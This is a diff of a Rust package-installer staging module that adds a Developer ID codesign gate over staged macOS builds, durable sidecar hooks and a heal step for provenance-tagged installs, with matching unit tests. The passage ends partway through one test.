@@ -34,6 +34,9 @@
 //!    passed every check above renamed into `build_dir`, and only then is the build marked
 //!    complete — durably too, so a marker whose NAME survives a crash can never vouch for
 //!    contents that did not.
+//! 5. **Caller hooks** ([`StageHooks`]) — a gate over the verified tree before anything
+//!    publishes it (the darwin Developer ID check, [`developer_id_gate`]), and sidecars
+//!    written durably after the swap and before the marker, so a marked build has them.
 //!
 //! Any failure removes the scratch tree and returns fail-closed — a half- or wrongly-staged
 //! build never reaches activation, and **a stage that cannot install the new build must not
@@ -49,16 +52,17 @@ use crate::extract::{
 use crate::manifest::Artifact;
 use crate::tree::{file_sha256, tree_root};
 
-/// Opt-in belt-and-suspenders: when this is set to a non-empty value, [`verify_and_stage`]
+/// Opt-in belt-and-suspenders, a DEVELOPMENT SEAM (`aterm_types::dev_seam!` — a shipped
+/// binary does not read it): when this is set to a non-empty value, [`verify_and_stage`]
 /// ALSO walks the staged tree with [`crate::tree::tree_root`] and refuses the stage unless
 /// the walk agrees with the root the extractor folded.
 ///
-/// It exists so the fused digest's equivalence is checkable on a real fleet machine over
-/// real bundles — not only over the unit corpus in `extract.rs` — and so an operator
-/// chasing a suspected filesystem fault can re-arm the historical
-/// read-it-all-back-again pass without a rebuild. It is OFF by default because turning it
-/// on restores exactly the cost this module stopped paying: a second full pass over the
-/// uncompressed payload (3.44 GB for the shipped `trust` member).
+/// It exists so the fused digest's equivalence is checkable over real bundles — not only
+/// over the unit corpus in `extract.rs` — by a developer chasing a suspected filesystem
+/// fault with a dev build. It is OFF by default because turning it on restores exactly
+/// the cost this module stopped paying: a second full pass over the uncompressed payload
+/// (3.44 GB for the shipped `trust` member). `aterm pkg verify` re-attests installed
+/// bytes in every build.
 const DISK_REVERIFY_ENV: &str = "ATPKG_STAGE_DISK_REVERIFY";
 
 /// Why staging a downloaded bundle failed. Each aborts the stage fail-closed.
@@ -78,13 +82,17 @@ pub enum StageError {
     /// refusing the image. Names the field or tool, so a mis-authored row fails fast on
     /// the authoring machine.
     Payload(String),
-    /// This installer is provenance-tracked, the untracked staging lane could not run,
-    /// and `ATPKG_REFUSE_TRACKED_INSTALL=1` asked for a refusal instead of the default —
-    /// an in-process stage RECORDED beside the build
-    /// ([`crate::store::record_tracked_install`]). The string is
-    /// [`crate::lay::tracked_refusal`]: why the lane failed, what the tag breaks, and the
-    /// way out.
+    /// This installer is provenance-tracked, the staged tree came out carrying the tag,
+    /// the tag could not be cleared ([`crate::provenance::heal`]), and the refuse policy
+    /// is in force (`[packages] tracked_install = "refuse"`) — so nothing was swapped in.
+    /// The string is [`crate::lay::tracked_refusal`].
     TrackedInstaller(String),
+    /// The staged tree's platform signer check refused it: a Mach-O not signed by the
+    /// pinned Developer ID team, no Mach-O at all, an exposed tool's entry that is not a
+    /// verified Mach-O, or a shape that would let code escape the check (an interpreter
+    /// script, a symlinked Mach-O) ([`developer_id_gate`]). Deterministic for these bytes,
+    /// which already matched their digest, so it is memoized like a digest refusal.
+    SignerRefused(String),
 }
 
 // Hand-rendered through `Formatter::write_str` + direct `Display::fmt` calls (no
@@ -120,11 +128,46 @@ impl std::fmt::Display for StageError {
                 f.write_str(m)
             }
             StageError::TrackedInstaller(m) => f.write_str(m),
+            StageError::SignerRefused(m) => {
+                f.write_str("signer refused: ")?;
+                f.write_str(m)
+            }
         }
     }
 }
 
 impl std::error::Error for StageError {}
+
+/// A stage's pre-swap hook: examines the verified `.incoming` tree.
+pub(crate) type PreSwapHook<'a> = &'a dyn Fn(&Path) -> Result<(), StageError>;
+
+/// A stage's sidecar hook: given the folded `tree_root`, the `(suffix, bytes)` sidecars to
+/// write beside the build — or the refusal that stops the stage before the swap.
+pub(crate) type SidecarHook<'a> =
+    &'a dyn Fn(&str) -> Result<Vec<(&'static str, Vec<u8>)>, StageError>;
+
+/// Caller steps inside [`verify_and_stage`]. [`StageHooks::NONE`] runs none and stages
+/// exactly as a stage without hooks.
+#[derive(Clone, Copy, Default)]
+pub struct StageHooks<'a> {
+    /// Run on the `.incoming` tree after the digest and `tree_root` checks and before
+    /// anything flushes or publishes it; an `Err` refuses the stage with nothing swapped,
+    /// marked or recorded.
+    pub pre_swap: Option<PreSwapHook<'a>>,
+    /// Asked once the tree is verified; each `(suffix, bytes)` is written durably as
+    /// `<build><suffix>` after the swap and before `.ready`, so `.ready` implies every
+    /// sidecar exists. A suffix outside [`crate::store::STAGE_SIDECAR_SUFFIXES`] refuses
+    /// the stage before the swap.
+    pub sidecars: Option<SidecarHook<'a>>,
+}
+
+impl StageHooks<'_> {
+    /// No hooks.
+    pub const NONE: StageHooks<'static> = StageHooks {
+        pre_swap: None,
+        sidecars: None,
+    };
+}
 
 /// Uncompressed-size cap for extraction: twice the signed `disk_installed` (tolerating
 /// block-rounding) but at least 1 MiB, so a decompression bomb is bounded by the *signed*
@@ -174,7 +217,8 @@ pub fn verify_and_stage(
     artifact: &Artifact,
     archive: &Path,
     build_dir: &Path,
-) -> Result<(), StageError> {
+    hooks: &StageHooks<'_>,
+) -> Result<String, StageError> {
     let scratch = archive
         .parent()
         .map(Path::to_path_buf)
@@ -189,13 +233,20 @@ pub fn verify_and_stage(
         tracked,
         &crate::lay::lane_for_this_binary(),
         crate::lay::tracked_policy(),
+        crate::provenance::heal,
+        hooks,
     )
 }
 
-/// [`verify_and_stage`] with the untracked lane's three inputs explicit — whether this
-/// process is tracked, which binary would serve the lane, and the policy when it cannot
-/// — so the recorded in-process stage, the opt-in refusal and the record beside the
-/// build are each provable from a test that is not itself in a position to be tracked.
+/// [`verify_and_stage`] with the untracked lane's inputs explicit — whether this process
+/// is tracked, which binary would serve the lane, the policy when the tag cannot be
+/// cleared, and the heal that clears it — so the healed stage, the opt-in refusal and
+/// the record beside the build are each provable from a test that is not itself in a
+/// position to be tracked.
+///
+/// Returns the `tree_root` folded while staging (the verified one when the row signs
+/// one).
+#[allow(clippy::too_many_arguments)] // the lane's inputs, each injected for its test
 pub fn verify_and_stage_with(
     artifact: &Artifact,
     archive: &Path,
@@ -203,7 +254,9 @@ pub fn verify_and_stage_with(
     tracked: bool,
     lane: &crate::lay::Lane,
     policy: crate::lay::TrackedPolicy,
-) -> Result<(), StageError> {
+    heal: crate::provenance::Healer,
+    hooks: &StageHooks<'_>,
+) -> Result<String, StageError> {
     // 1. Download integrity — the compressed asset's sha256 must match the signed value,
     //    BEFORE we spend any work extracting it.
     let got = file_sha256(archive).map_err(StageError::Io)?;
@@ -235,7 +288,7 @@ pub fn verify_and_stage_with(
     let StagedTree {
         root: extracted_root,
         tracked_record,
-    } = match stage_for_store_with(artifact, archive, &incoming, tracked, lane, policy) {
+    } = match stage_for_store_with(artifact, archive, &incoming, tracked, lane) {
         Ok(staged) => staged,
         Err(e) => {
             let _ = std::fs::remove_dir_all(&incoming);
@@ -265,11 +318,14 @@ pub fn verify_and_stage_with(
     //    by earlier releases), so the two producers share one formatter and one fold
     //    (`tree::entry_line` / `tree::root_of_entry_lines`) and an exhaustive parity test
     //    pins them together (`extract.rs`,
-    //    `fused_tree_root_is_byte_identical_to_the_on_disk_walk`). `ATPKG_STAGE_DISK_REVERIFY`
-    //    re-arms the on-disk walk as a cross-check on a real machine, and `atpkg verify`
+    //    `fused_tree_root_is_byte_identical_to_the_on_disk_walk`). The
+    //    `ATPKG_STAGE_DISK_REVERIFY` development seam re-arms the on-disk walk as a
+    //    cross-check in a dev build, and `atpkg verify`
     //    — the surface whose claim really IS "what is on disk right now" — still walks the
     //    tree, unchanged.
-    if !artifact.tree_root.is_empty() {
+    let root = if artifact.tree_root.is_empty() {
+        extracted_root
+    } else {
         let got = match reverified_root(&incoming, extracted_root, disk_reverify_armed()) {
             Ok(r) => r,
             Err(e) => {
@@ -284,7 +340,68 @@ pub fn verify_and_stage_with(
                 got,
             });
         }
+        got
+    };
+
+    // 3a. THE CALLER'S GATE AND RECORDS, on the verified tree and before anything
+    //     publishes it: a refusal here leaves no build, no marker and no sidecar. The
+    //     sidecars are rendered now so a bad suffix refuses before the swap too; they are
+    //     written after it.
+    if let Some(pre_swap) = hooks.pre_swap
+        && let Err(e) = pre_swap(&incoming)
+    {
+        let _ = std::fs::remove_dir_all(&incoming);
+        return Err(e);
     }
+    let sidecars = match hooks.sidecars.map(|render| render(&root)).transpose() {
+        Ok(sidecars) => sidecars.unwrap_or_default(),
+        Err(e) => {
+            let _ = std::fs::remove_dir_all(&incoming);
+            return Err(e);
+        }
+    };
+    if let Some((suffix, _)) = sidecars
+        .iter()
+        .find(|(suffix, _)| !crate::store::STAGE_SIDECAR_SUFFIXES.contains(suffix))
+    {
+        let _ = std::fs::remove_dir_all(&incoming);
+        return Err(payload2(
+            "sidecar suffix the store does not reclaim: ",
+            suffix,
+        ));
+    }
+
+    // 3a'. THE TAG. A tree this tracked installer laid in-process (its lane could not run),
+    //      or one its lane laid tagged all the same, is cleared in place here, before
+    //      anything publishes it ([`crate::provenance::heal`]: one launchd job, then a
+    //      scan). Only a heal that fails is kept on record — the refuse policy refuses
+    //      the stage with nothing swapped, the default installs it and records why (4b).
+    let tracked_record = match tracked_record {
+        None => None,
+        Some(why) => {
+            let scratch = archive
+                .parent()
+                .map(Path::to_path_buf)
+                .unwrap_or_else(std::env::temp_dir);
+            let healed = heal(std::slice::from_ref(&incoming), &scratch);
+            if healed.is_clean() {
+                None
+            } else {
+                let why = format!(
+                    "{why}; the tag could not be cleared ({})",
+                    healed.why().unwrap_or("no reason given")
+                );
+                if policy == crate::lay::TrackedPolicy::Refuse {
+                    let _ = std::fs::remove_dir_all(&incoming);
+                    return Err(StageError::TrackedInstaller(crate::lay::tracked_refusal(
+                        "installing this build",
+                        &why,
+                    )));
+                }
+                Some(why)
+            }
+        }
+    };
 
     // 3b. DURABILITY, before anything publishes this tree. Every check above is about the
     //     bytes this process WROTE; none of them is about bytes the filesystem has
@@ -308,22 +425,21 @@ pub fn verify_and_stage_with(
         return Err(StageError::Io(e));
     }
 
-    // 4b. THE RECORD. A tree a tracked installer laid in-process because its lane could not run
-    //     is written down beside the build (`<build>.tracked-install`, a sibling like
-    //     `.ready`, outside the hashed tree) BEFORE the build is marked complete: a
-    //     record that could not be written leaves the build unmarked — re-stageable, and
-    //     honestly not the clean install the marker would claim — rather than a tagged
-    //     bundle nothing on disk explains. A clean stage clears any record a previous
-    //     stage of this build number left, so `doctor` never names a cause that is gone.
+    // 4b. THE RECORD. A tree whose tag could not be cleared (3a') is written down beside
+    //     the build (`<build>.tracked-install`, a sibling like `.ready`, outside the
+    //     hashed tree) BEFORE the build is marked complete: a record that could not be
+    //     written leaves the build unmarked — re-stageable — rather than a tagged bundle
+    //     nothing on disk explains. A clean stage clears any record a previous stage of
+    //     this build number left; the store heal clears it once the build measures clean
+    //     ([`crate::provenance::heal_store`]).
     crate::store::clear_tracked_install(build_dir);
     if let Some(why) = &tracked_record {
         if let Err(e) = crate::store::record_tracked_install(build_dir, why) {
             return Err(StageError::Io(e));
         }
-        // THE MARKER (2026-09-15): the record beside the build is for `doctor` and
-        // `repair`; this line is for the window, which turns it into a Warn row on the
-        // toolchain lane — a tagged toolchain installed by the default policy must never
-        // be a silent one (audit 2026-09-14).
+        // ONE plain line, and only because the system could not fix it itself: stderr on
+        // a typed verb, the log in the window ([`crate::notice`]). `aterm pkg doctor`
+        // counts what is still tagged; `aterm pkg repair` tries again.
         let build = build_dir
             .file_name()
             .map(|n| n.to_string_lossy().into_owned())
@@ -333,11 +449,28 @@ pub fn verify_and_stage_with(
             .and_then(|p| p.file_name())
             .map(|n| n.to_string_lossy().into_owned())
             .unwrap_or_default();
-        println!(
-            "atpkg: {}{program} build {build} — {}",
-            crate::cli::TRACKED_INSTALL_MARKER,
-            crate::cli::clip_cause(why)
+        // A vendor-direct build is named by its version, never its store id.
+        let named = crate::store::parse_build_name(&build).map_or_else(
+            || format!("{program} build {build}"),
+            |n| crate::vendor_direct::display_build(&program, n),
         );
+        crate::notice::say(&format!(
+            "could not clear a macOS tag from {named} (release builds refuse tagged files) \
+             — `aterm pkg repair` tries again"
+        ));
+    }
+
+    // 4c. THE CALLER'S SIDECARS, durably, then the directory that names them: `.ready`
+    //     below implies each one exists. A write that fails leaves the verified tree
+    //     unmarked, re-stageable, exactly like a record that could not be written.
+    if !sidecars.is_empty() {
+        for (suffix, bytes) in &sidecars {
+            crate::store::write_sidecar_durably(build_dir, suffix, bytes)
+                .map_err(StageError::Io)?;
+        }
+        if let Some(parent) = build_dir.parent() {
+            crate::store::sync_dir(parent);
+        }
     }
 
     // 5. Mark the build COMPLETE — the last step, written atomically AFTER the tree_root
@@ -369,6 +502,136 @@ pub fn verify_and_stage_with(
     }
     if let Some(parent) = build_dir.parent() {
         crate::store::sync_dir(parent);
+    }
+    Ok(root)
+}
+
+/// How long [`developer_id_gate`] may spend verifying one tree, across every Mach-O in
+/// it: each codesign call is bounded on its own, and this bounds their number.
+const DEVELOPER_ID_BUDGET: std::time::Duration = std::time::Duration::from_secs(120);
+
+/// A [`StageHooks::pre_swap`] gate for a darwin agent build: every Mach-O in the staged
+/// tree ([`crate::macho::find_macho`], by magic, regular files only, no interpreter
+/// script) must verify as signed by Developer ID `team` (`check`, production:
+/// [`codesign_team_check`]), there must be at least one, each exposed tool's
+/// `bin/<tool>` — what its shim runs — must be one of them, and no other file may carry
+/// an execute bit. Off macOS there is no platform anchor and it passes.
+///
+/// codesign's verdict on these bytes ([`CodesignError::is_verdict`]) is
+/// [`StageError::SignerRefused`]; a team or tool name that is not one is a
+/// [`StageError::Payload`]; codesign failing to judge them (an unreadable file, an
+/// internal error, a timeout) is [`StageError::Io`] — a fact about this machine, retried
+/// rather than memoized.
+///
+/// [`CodesignError::is_verdict`]: aterm_update_core::codesign::CodesignError::is_verdict
+pub(crate) fn developer_id_gate(
+    team: &str,
+    exposes: &[&str],
+    check: TeamCheck,
+) -> impl Fn(&Path) -> Result<(), StageError> + use<> {
+    let team = team.to_string();
+    let exposes: Vec<String> = exposes.iter().map(|t| (*t).to_string()).collect();
+    move |tree: &Path| {
+        if !cfg!(target_os = "macos") {
+            return Ok(());
+        }
+        let verify = |path: &Path, deadline: std::time::Instant| check(path, &team, deadline);
+        check_developer_id(tree, &team, &exposes, &verify)
+    }
+}
+
+/// How [`developer_id_gate`] judges one Mach-O against a team by a deadline.
+pub(crate) type TeamCheck =
+    fn(&Path, &str, std::time::Instant) -> Result<(), aterm_update_core::codesign::CodesignError>;
+
+/// The real [`TeamCheck`]: `/usr/bin/codesign` under the pinned Developer ID requirement.
+///
+/// # Errors
+/// codesign's verdict, or its failure to give one.
+pub(crate) fn codesign_team_check(
+    path: &Path,
+    team: &str,
+    deadline: std::time::Instant,
+) -> Result<(), aterm_update_core::codesign::CodesignError> {
+    aterm_update_core::codesign::verify_developer_id_until(path, team, false, deadline)
+}
+
+/// One Mach-O's Developer ID check, finished by the deadline.
+type VerifyOne<'a> =
+    &'a dyn Fn(&Path, std::time::Instant) -> Result<(), aterm_update_core::codesign::CodesignError>;
+
+/// [`developer_id_gate`]'s rules over `tree`, with each Mach-O checked by `verify`.
+fn check_developer_id(
+    tree: &Path,
+    team: &str,
+    exposes: &[String],
+    verify: VerifyOne<'_>,
+) -> Result<(), StageError> {
+    use aterm_update_core::codesign::{CodesignError, VERIFY_TIMEOUT};
+    if exposes.is_empty() {
+        return Err(payload2(
+            "developer id gate: no exposed tool to bind for team ",
+            team,
+        ));
+    }
+    let found = crate::macho::find_macho(tree)?;
+    if found.is_empty() {
+        let mut m = String::from("no Mach-O in the staged tree; a darwin build must carry ");
+        m.push_str("at least one, signed by Developer ID team ");
+        m.push_str(team);
+        return Err(StageError::SignerRefused(m));
+    }
+    // What each shim runs must be a verified Mach-O, or a decoy beside it satisfies the
+    // floor while the entry runs unchecked.
+    for name in exposes {
+        let Some(tool) = crate::store::ToolName::new(name) else {
+            return Err(payload2("developer id gate: not a tool name: ", name));
+        };
+        let entry = tree.join("bin").join(tool.exe_file());
+        if !found.contains(&entry) {
+            let mut m = String::from("bin/");
+            m.push_str(&tool.exe_file());
+            m.push_str(" is not a Mach-O in the staged tree; its shim would run it unverified");
+            return Err(StageError::SignerRefused(m));
+        }
+    }
+    // Any execute bit sits on a verified Mach-O: a text file carrying one runs through
+    // `/bin/sh`, signature unchecked.
+    if let Some(stray) = crate::macho::executable_files(tree)?
+        .into_iter()
+        .find(|p| !found.contains(p))
+    {
+        let mut m = stray
+            .strip_prefix(tree)
+            .unwrap_or(&stray)
+            .to_string_lossy()
+            .into_owned();
+        m.push_str(" is executable but not a Mach-O; it would run unverified");
+        return Err(StageError::SignerRefused(m));
+    }
+    let budget = std::time::Instant::now() + DEVELOPER_ID_BUDGET;
+    for path in &found {
+        let deadline = budget.min(std::time::Instant::now() + VERIFY_TIMEOUT);
+        let rel = path.strip_prefix(tree).unwrap_or(path).to_string_lossy();
+        let mut m = String::from(rel.as_ref());
+        match verify(path, deadline) {
+            Ok(()) => {}
+            Err(e) if e.is_verdict() => {
+                m.push_str(" is not signed by Developer ID team ");
+                m.push_str(team);
+                m.push_str(": ");
+                m.push_str(&e.to_string());
+                return Err(StageError::SignerRefused(m));
+            }
+            Err(e @ CodesignError::InvalidTeam(_)) => {
+                return Err(payload2("developer id gate: ", &e.to_string()));
+            }
+            Err(e) => {
+                m.push_str(": ");
+                m.push_str(&e.to_string());
+                return Err(StageError::Io(std::io::Error::other(m)));
+            }
+        }
     }
     Ok(())
 }
@@ -448,75 +711,60 @@ impl StageSpec {
 
 /// What [`stage_for_store_with`] laid: the folded `tree_root`, and — when a tracked
 /// installer laid it in-process because its lane could not run, or kept a lane's tree
-/// that came back tagged — the reason, to be recorded beside the build.
+/// that came back tagged — why the tree may carry the tag, for the heal that follows
+/// ([`verify_and_stage_with`]) and, if that fails, the record beside the build.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct StagedTree {
     /// The folded `tree_root`.
     pub root: String,
-    /// `Some(why)` iff the tree carries the tag by the operator's choice.
+    /// `Some(why)` iff the tree may carry the tag.
     pub tracked_record: Option<String>,
 }
 
-/// What a tracked installer does with its lane's outcome under a policy — the pure
-/// decision behind [`stage_for_store_with`], so every cell of the table is testable
-/// without a launchd job (or without being tracked).
+/// What a tracked installer does with its lane's outcome — the pure decision behind
+/// [`stage_for_store_with`], so every cell is testable without a launchd job (or without
+/// being tracked). No cell refuses: a tagged tree is cleared afterwards, and only a
+/// clearing that fails meets the policy ([`verify_and_stage_with`]).
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum LaneDecision {
     /// The lane laid a clean tree: keep it.
     Keep(String),
-    /// The lane laid a tree that nevertheless came back tagged; `Allow` keeps it — it is
-    /// the verified tree, and re-extracting would only produce a tagged one — and records
-    /// why.
-    KeepRecorded { root: String, why: String },
-    /// The lane could not run; `Allow` stages in-process and records why.
-    InProcessRecorded(String),
-    /// `Refuse`: the reason, already rendered as the refusal.
-    Refuse(String),
+    /// The lane laid a tree that came back tagged: keep it — it is the verified tree, and
+    /// re-extracting would only produce another tagged one — and clear the tag.
+    KeepTagged { root: String, why: String },
+    /// The lane could not run: stage in-process and clear the tag.
+    InProcess(String),
 }
 
-/// See [`LaneDecision`].
+/// See [`LaneDecision`]. The reasons are for the record beside the build, never for glass.
 #[must_use]
 pub fn decide_tracked_stage(
     outcome: Result<crate::stage_helper::StagedUntracked, String>,
-    policy: crate::lay::TrackedPolicy,
 ) -> LaneDecision {
-    use crate::lay::TrackedPolicy;
-    match (outcome, policy) {
-        (Ok(staged), _) if !staged.witness_tagged => LaneDecision::Keep(staged.root),
-        (Ok(staged), TrackedPolicy::Allow) => LaneDecision::KeepRecorded {
+    match outcome {
+        Ok(staged) if !staged.witness_tagged => LaneDecision::Keep(staged.root),
+        Ok(staged) => LaneDecision::KeepTagged {
             root: staged.root,
-            why: String::from(
-                "the untracked lane ran, but the first file it laid still carried \
-                 com.apple.provenance",
-            ),
+            why: String::from("the clean-install helper ran, but its files came back tagged"),
         },
-        (Ok(_), TrackedPolicy::Refuse) => LaneDecision::Refuse(crate::lay::tracked_refusal(
-            "stage the bundle clean",
-            "the lane ran, but the first file it laid still carried com.apple.provenance",
-        )),
-        (Err(why), TrackedPolicy::Allow) => {
-            LaneDecision::InProcessRecorded(format!("the untracked lane could not run ({why})"))
-        }
-        (Err(why), TrackedPolicy::Refuse) => {
-            LaneDecision::Refuse(crate::lay::tracked_refusal("stage the bundle", &why))
+        Err(why) => {
+            LaneDecision::InProcess(format!("the clean-install helper could not start ({why})"))
         }
     }
 }
 
 /// Stage for the STORE: [`stage_payload`], except that a provenance-TRACKED installer
-/// hands the extraction to an untracked launchd job ([`crate::stage_helper`]) — and,
-/// when that lane cannot run, does what the policy says rather than quietly staging
-/// tagged files.
+/// hands the extraction to an untracked launchd job ([`crate::stage_helper`]) and, when
+/// that lane cannot run, stages in-process and says the tree may be tagged
+/// ([`StagedTree::tracked_record`]) so the caller clears it.
 ///
 /// `tracked` is measured by the caller ([`verify_and_stage`]: a probe file written into
 /// the staging scratch and read back for `com.apple.provenance`) — a tracked atpkg would
 /// otherwise tag every executable it lays down, and a tagged `trustc` cannot cut a
 /// release (v0.83.0, 2026-09-12). An untracked installer takes exactly the path it always
 /// took, as does a binary with no lane ([`crate::lay::Lane::Unavailable`]: a test harness
-/// — a fact about the binary, not a failure). A tracked one whose lane fails is staged
-/// in-process and RECORDED under [`crate::lay::TrackedPolicy::Allow`] (the default), or
-/// refused with [`StageError::TrackedInstaller`] under `Refuse`
-/// (`ATPKG_REFUSE_TRACKED_INSTALL=1`). The decision table is [`decide_tracked_stage`].
+/// — a fact about the binary, not a failure). The decision table is
+/// [`decide_tracked_stage`].
 ///
 /// On `Err`, `incoming` is left empty for the caller to remove.
 pub fn stage_for_store_with(
@@ -525,7 +773,6 @@ pub fn stage_for_store_with(
     incoming: &Path,
     tracked: bool,
     lane: &crate::lay::Lane,
-    policy: crate::lay::TrackedPolicy,
 ) -> Result<StagedTree, StageError> {
     let helper = match (tracked, lane) {
         (true, crate::lay::Lane::Helper(exe)) => exe,
@@ -547,42 +794,19 @@ pub fn stage_for_store_with(
         incoming,
         &scratch,
     );
-    match decide_tracked_stage(outcome, policy) {
+    match decide_tracked_stage(outcome) {
         LaneDecision::Keep(root) => Ok(StagedTree {
             root,
             tracked_record: None,
         }),
-        LaneDecision::KeepRecorded { root, why } => Ok(StagedTree {
+        LaneDecision::KeepTagged { root, why } => Ok(StagedTree {
             root,
             tracked_record: Some(why),
         }),
-        LaneDecision::InProcessRecorded(why) => {
-            eprintln!(
-                "atpkg: note — this installer is provenance-tracked and {why}; the bundle \
-                 is staged in-process and WILL carry com.apple.provenance — recorded \
-                 beside the build for `aterm pkg doctor`; {}=1 refuses instead",
-                crate::lay::REFUSE_TRACKED_ENV
-            );
-            Ok(StagedTree {
-                root: stage_payload(artifact, archive, incoming)?,
-                tracked_record: Some(why),
-            })
-        }
-        LaneDecision::Refuse(msg) => {
-            // The lane may have left a (tagged) tree on the measured-tagged path; a
-            // refused stage leaves `incoming` empty for the caller.
-            if let Ok(entries) = std::fs::read_dir(incoming) {
-                for e in entries.flatten() {
-                    let p = e.path();
-                    let _ = if std::fs::symlink_metadata(&p).is_ok_and(|m| m.is_dir()) {
-                        std::fs::remove_dir_all(&p)
-                    } else {
-                        std::fs::remove_file(&p)
-                    };
-                }
-            }
-            Err(StageError::TrackedInstaller(msg))
-        }
+        LaneDecision::InProcess(why) => Ok(StagedTree {
+            root: stage_payload(artifact, archive, incoming)?,
+            tracked_record: Some(why),
+        }),
     }
 }
 
@@ -1233,7 +1457,7 @@ fn stage_dmg(_image: &Path, _dest: &Path) -> Result<(), StageError> {
 /// `std::env::set_var` is `unsafe` for in edition 2024, and is a data race under a
 /// multi-threaded test runner regardless).
 fn disk_reverify_armed() -> bool {
-    std::env::var_os(DISK_REVERIFY_ENV).is_some_and(|v| !v.is_empty())
+    aterm_types::dev_seam!(DISK_REVERIFY_ENV).is_some_and(|v| !v.is_empty())
 }
 
 /// The root step 3 compares against the signed value: the one the extractor folded, or —
@@ -1396,78 +1620,73 @@ mod tests {
     }
 
     /// The decision table behind a tracked installer's stage, every cell: a clean lane
-    /// keeps; a lane that could not run stages in-process (recorded) under `Allow`, the
-    /// default, and refuses under `Refuse`; a lane whose tree came back tagged keeps
-    /// that tree (recorded) under `Allow` — never a second extraction that would only
-    /// produce another tagged tree — and refuses under `Refuse`.
+    /// keeps; a lane whose tree came back tagged keeps that tree — never a second
+    /// extraction that would only produce another tagged one — and a lane that could not
+    /// run stages in-process. No cell refuses: the tag is cleared afterwards, and only a
+    /// clearing that fails meets the policy.
     #[test]
     fn the_tracked_stage_decision_table_is_complete() {
-        use crate::lay::TrackedPolicy::{Allow, Refuse};
         use crate::stage_helper::StagedUntracked;
-        let clean = || {
+        let staged = |witness_tagged| {
             Ok(StagedUntracked {
                 root: "r".into(),
-                witness_tagged: false,
+                witness_tagged,
             })
         };
-        let tagged = || {
-            Ok(StagedUntracked {
-                root: "r".into(),
-                witness_tagged: true,
-            })
-        };
-        let failed = || {
-            Err(String::from(
-                "the untracked helper job x exited without a result",
-            ))
-        };
         assert_eq!(
-            decide_tracked_stage(clean(), Refuse),
+            decide_tracked_stage(staged(false)),
             LaneDecision::Keep("r".into())
         );
-        assert_eq!(
-            decide_tracked_stage(clean(), Allow),
-            LaneDecision::Keep("r".into())
-        );
-        match decide_tracked_stage(failed(), Refuse) {
-            LaneDecision::Refuse(msg) => {
-                assert!(msg.contains("could not stage the bundle"), "{msg}");
-                assert!(msg.contains("exited without a result"), "{msg}");
-                assert!(msg.contains(crate::lay::REFUSE_TRACKED_ENV), "{msg}");
-            }
-            other => panic!("{other:?}"),
-        }
-        match decide_tracked_stage(failed(), Allow) {
-            LaneDecision::InProcessRecorded(why) => {
-                assert!(why.contains("could not run"), "{why}");
-                assert!(why.contains("exited without a result"), "{why}");
-            }
-            other => panic!("{other:?}"),
-        }
-        match decide_tracked_stage(tagged(), Refuse) {
-            LaneDecision::Refuse(msg) => {
-                assert!(msg.contains("still carried com.apple.provenance"), "{msg}");
-            }
-            other => panic!("{other:?}"),
-        }
-        match decide_tracked_stage(tagged(), Allow) {
-            LaneDecision::KeepRecorded { root, why } => {
+        match decide_tracked_stage(staged(true)) {
+            LaneDecision::KeepTagged { root, why } => {
                 assert_eq!(root, "r");
-                assert!(why.contains("still carried"), "{why}");
+                assert!(why.contains("came back tagged"), "{why}");
+            }
+            other => panic!("{other:?}"),
+        }
+        match decide_tracked_stage(Err(String::from(
+            "the untracked helper job x exited without a result",
+        ))) {
+            LaneDecision::InProcess(why) => {
+                assert!(why.contains("could not start"), "{why}");
+                assert!(why.contains("exited without a result"), "{why}");
             }
             other => panic!("{other:?}"),
         }
     }
 
+    /// A heal that clears what it was handed.
+    #[cfg(target_os = "macos")]
+    fn heal_clears(roots: &[PathBuf], _scratch: &Path) -> crate::provenance::HealOutcome {
+        assert_eq!(roots.len(), 1, "one tree: the one being staged");
+        crate::provenance::HealOutcome::Healed { cleared: 1 }
+    }
+
+    /// A heal that could not clear what it was handed.
+    #[cfg(target_os = "macos")]
+    fn heal_fails(roots: &[PathBuf], _scratch: &Path) -> crate::provenance::HealOutcome {
+        crate::provenance::HealOutcome::Left {
+            carriers: roots.to_vec(),
+            why: String::from("xattr exited 1"),
+        }
+    }
+
+    /// A stage that has nothing to clear never asks.
+    #[cfg(target_os = "macos")]
+    fn heal_not_asked(_roots: &[PathBuf], _scratch: &Path) -> crate::provenance::HealOutcome {
+        panic!("a stage that laid nothing tagged must not run the heal")
+    }
+
     /// The failure path, with a helper BROKEN ON PURPOSE (`/usr/bin/true` under the name
-    /// `atpkg`: spelled right, answers nothing) and the tracking measurement forced:
-    /// under `Refuse` the stage is REFUSED — nothing installed, no marker, no record, the
-    /// refusal naming the cause and the knob; under `Allow` (the default) it installs,
-    /// marks the build complete and RECORDS the cause beside it; and a later clean stage
-    /// of the same build number clears the record.
+    /// `atpkg`: spelled right, answers nothing) and the tracking measurement forced, so
+    /// the bundle is staged in-process: a heal that clears it leaves a plain install — no
+    /// record, under either policy; a heal that fails is REFUSED under `Refuse` (nothing
+    /// installed, no marker, no record, no scratch) and installed WITH the record under
+    /// `Allow`; a later clean stage of the same build number clears the record. And the
+    /// real heal, end to end: whatever this process tagged is cleared before the swap.
     #[cfg(target_os = "macos")]
     #[test]
-    fn a_tracked_installer_whose_lane_fails_refuses_under_refuse_and_records_under_allow() {
+    fn a_tracked_installers_tagged_stage_is_healed_and_only_a_failed_heal_refuses_or_records() {
         use crate::lay::{Lane, TrackedPolicy};
         let d = tmp("tracked-refuse");
         let archive = make_archive(&d);
@@ -1484,59 +1703,347 @@ mod tests {
         let fake = fake_dir.join("atpkg");
         std::fs::copy("/usr/bin/true", &fake).unwrap();
         let broken = Lane::Helper(fake);
+        let stage = |policy, heal: crate::provenance::Healer, tracked, lane: &Lane| {
+            verify_and_stage_with(
+                &a,
+                &archive,
+                &build,
+                tracked,
+                lane,
+                policy,
+                heal,
+                &StageHooks::NONE,
+            )
+        };
 
-        // `Refuse` opted into: refused.
-        let err = verify_and_stage_with(&a, &archive, &build, true, &broken, TrackedPolicy::Refuse)
-            .expect_err("a tracked installer with a broken lane must refuse under Refuse");
+        // Healed: a plain install, under either policy.
+        for policy in [TrackedPolicy::Refuse, TrackedPolicy::Allow] {
+            stage(policy, heal_clears, true, &broken).expect("a healed stage installs");
+            assert!(crate::store::build_is_complete(&build));
+            assert_eq!(crate::store::tracked_install_record(&build), None);
+        }
+
+        // Not healed, `Refuse` opted into: refused before the swap, so the build that
+        // stood is still the one installed.
+        let inode = |p: &Path| {
+            use std::os::unix::fs::MetadataExt as _;
